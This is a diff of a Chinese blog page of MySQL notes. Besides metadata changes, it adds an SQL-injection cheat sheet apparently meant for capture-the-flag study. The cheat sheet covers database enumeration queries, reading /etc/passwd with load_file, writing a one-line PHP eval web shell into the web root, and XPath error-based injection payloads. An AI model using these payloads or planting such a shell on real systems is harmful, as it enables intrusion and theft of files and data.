@@ -24,14 +24,16 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="mysql语法">
 <meta property="og:url" content="http://example.com/2023/02/16/mysql/index.html">
-<meta property="og:site_name" content="not coder">
+<meta property="og:site_name" content="blog">
 <meta property="og:description" content="mysql语法">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/10/23/a4ccff453d82a870.png">
 <meta property="article:published_time" content="2023-02-16T06:30:53.000Z">
-<meta property="article:modified_time" content="2023-06-11T11:32:04.510Z">
+<meta property="article:modified_time" content="2023-10-24T03:38:36.000Z">
 <meta property="article:author" content="小zhou">
 <meta property="article:tag" content="mysql">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s3.bmp.ovh/imgs/2023/10/23/a4ccff453d82a870.png">
 
 <link rel="canonical" href="http://example.com/2023/02/16/mysql/">
 
@@ -46,7 +48,7 @@
   };
 </script>
 
-  <title>mysql语法 | not coder</title>
+  <title>mysql语法 | blog</title>
   
 
 
@@ -97,7 +99,7 @@
 
     <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">not coder</h1>
+      <h1 class="site-title">blog</h1>
       <span class="logo-line-after"><i></i></span>
     </a>
   </div>
@@ -203,7 +205,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="not coder">
+      <meta itemprop="name" content="blog">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
@@ -224,7 +226,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-06-11 19:32:04" itemprop="dateModified" datetime="2023-06-11T19:32:04+08:00">2023-06-11</time>
+                <time title="修改时间：2023-10-24 11:38:36" itemprop="dateModified" datetime="2023-10-24T11:38:36+08:00">2023-10-24</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -242,14 +244,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>828</span>
+              <span>1.2k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
+              <span>4 分钟</span>
             </span>
 
         </div>
@@ -358,6 +360,24 @@ create table student3 select * from student;  #创建 student3 并复制student�
 <p>SQL函数Group_concat用法</p>
 <p>拼接字符串</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35531549/article/details/90383022">(6条消息) SQL函数Group_concat用法_group_concat sql_寸草心2130的博客-CSDN博客</a></p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/10/23/a4ccff453d82a870.png"></p>
+<p>常用语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> 当前用户：select user() </span><br><span class="line">数据库版本：select version() , select @@version </span><br><span class="line">数据库名：select database()</span><br><span class="line">操作系统：select @@version_compile_os</span><br><span class="line">所有变量：show variables</span><br><span class="line">单个变量：select @@secure_file_priv , show variables like &#x27;secure_file_%&#x27;</span><br><span class="line">爆字段数：order by 1... ，group by 1...</span><br><span class="line">查库名：select group_concat(schema_name) from information_schema.schemata</span><br><span class="line">查表名：select group_concat(table_name) from information_schema.tables where table_schema=&#x27;库名&#x27;</span><br><span class="line">查字段：select group_concat(column_name) from information_schema.columns where table_name=&#x27;表名&#x27;</span><br><span class="line">读取某行：select * from mysql.user limit n,m // limit m offset n （第n行之后m行，第一行为0）</span><br><span class="line">读文件：select load_file(&#x27;/etc/passwd&#x27;)</span><br><span class="line">写文件：select &#x27;&lt;?php @eval($_POST[a]);?&gt;&#x27; into outfile &#x27;/var/www/html/a.php&#x27;  //该处文件名无法使用16进制绕过</span><br></pre></td></tr></table></figure>
+
+<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">截取字符串：substr(&#x27;abc&#x27;,1,1)、substring(&#x27;abc&#x27;,1,1)、left(&#x27;abc&#x27;,1)、right(&#x27;abc&#x27;,1)，mid(&#x27;abc&#x27;,1,1)</span><br><span class="line">字符串拼接：concat(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;)，concat_ws(&#x27; &#x27;,&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;)</span><br><span class="line">多行拼接：group_concat //eg: select group_concat(user) from mysql.user</span><br><span class="line">时延函数：sleep(5)、benchmark(10000000,md5(&#x27;123456&#x27;)) //其他方法get_lock()，笛卡尔，rlike等</span><br><span class="line">编码函数: hex、ord、ascii、char、conv(255,10,16)=FF（2-36进制转换）</span><br><span class="line">布尔条件：if(1,1,0)、position(&#x27;a&#x27; in &#x27;abc&#x27;)、elt(1,&#x27;a&#x27;,&#x27;b&#x27;)=a&amp;&amp;elt(2,&#x27;a&#x27;,&#x27;b&#x27;)=b、(case when (bool) then 1 else 0 end)、field(&#x27;a&#x27;,3,2,&#x27;a&#x27;)=3、nullif(&#x27;a&#x27;,&#x27;b&#x27;)=1&amp;&amp;nullif(&#x27;a&#x27;,&#x27;a&#x27;)=null、strcmp、regexp、rlike、regexp_like(&#x27;1&#x27;,&#x27;1&#x27;)...</span><br></pre></td></tr></table></figure>
+
+<p>Xpath 报错注入</p>
+<p>原理比较简单</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">updatexml (XML_document, XPath_string, new_value);</span><br><span class="line">extractvalue(XML_document, XPath_string)</span><br></pre></td></tr></table></figure>
+
+<p>因为我们输入的第二个参数不符合xpath格式自然报错，xpath_string最大长度为32位，所以报错长度也为32位</p>
+<p>（1）extractvalue()：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select extractvalue(1,concat(0x7e,(select user()),0x7e));</span><br></pre></td></tr></table></figure>
+
+<p>（2）updatexml()：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select user()),0x7e),1);</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kagari/p/12635654.html#information_schema%E7%BB%95%E8%BF%87">CTF考点总结-sql注入 - <del>kagi</del> - 博客园 (cnblogs.com)</a></p>
 
     </div>
 
@@ -461,7 +481,7 @@ create table student3 select * from student;  #创建 student3 并复制student�
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">基本使用</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">基本使用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BD%E6%95%B0"><span class="nav-number">1.1.</span> <span class="nav-text">函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">1.2.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -477,7 +497,7 @@ create table student3 select * from student;  #创建 student3 并复制student�
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">60</span>
+          <span class="site-state-item-count">64</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -526,12 +546,12 @@ create table student3 select * from student;  #创建 student3 并复制student�
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">82k</span>
+    <span title="站点总字数">87k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">4:58</span>
+    <span title="站点阅读时长">5:16</span>
 </div>
 
 <!--
